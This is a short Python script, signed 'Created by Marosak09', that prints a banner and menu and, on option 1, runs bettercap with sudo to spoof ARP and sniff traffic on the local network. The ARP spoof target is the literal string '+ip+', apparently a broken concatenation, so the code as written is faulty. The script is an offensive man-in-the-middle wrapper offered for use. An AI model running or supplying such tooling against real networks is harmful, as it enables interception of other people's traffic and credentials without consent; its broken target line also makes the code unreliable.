import os
import time
print("Created by Marosak09")
time.sleep (2)
os.system('clear')
def sniffer():
    os.system('sudo bettercap -eval "clear ; net.recon on ; net.probe on; set arp.spoof.targets +ip+  ; set arp.spoof on ; set net.sniff.verbose false ; net.sniff on ;" ')
    
#menu
os.system('figlet sniffer')
print("[1] ==> Start Sniffing")
print("[2] ==> end script")
print("")
opt_menu = input(">>> ")
if opt_menu == "1":
    sniffer()
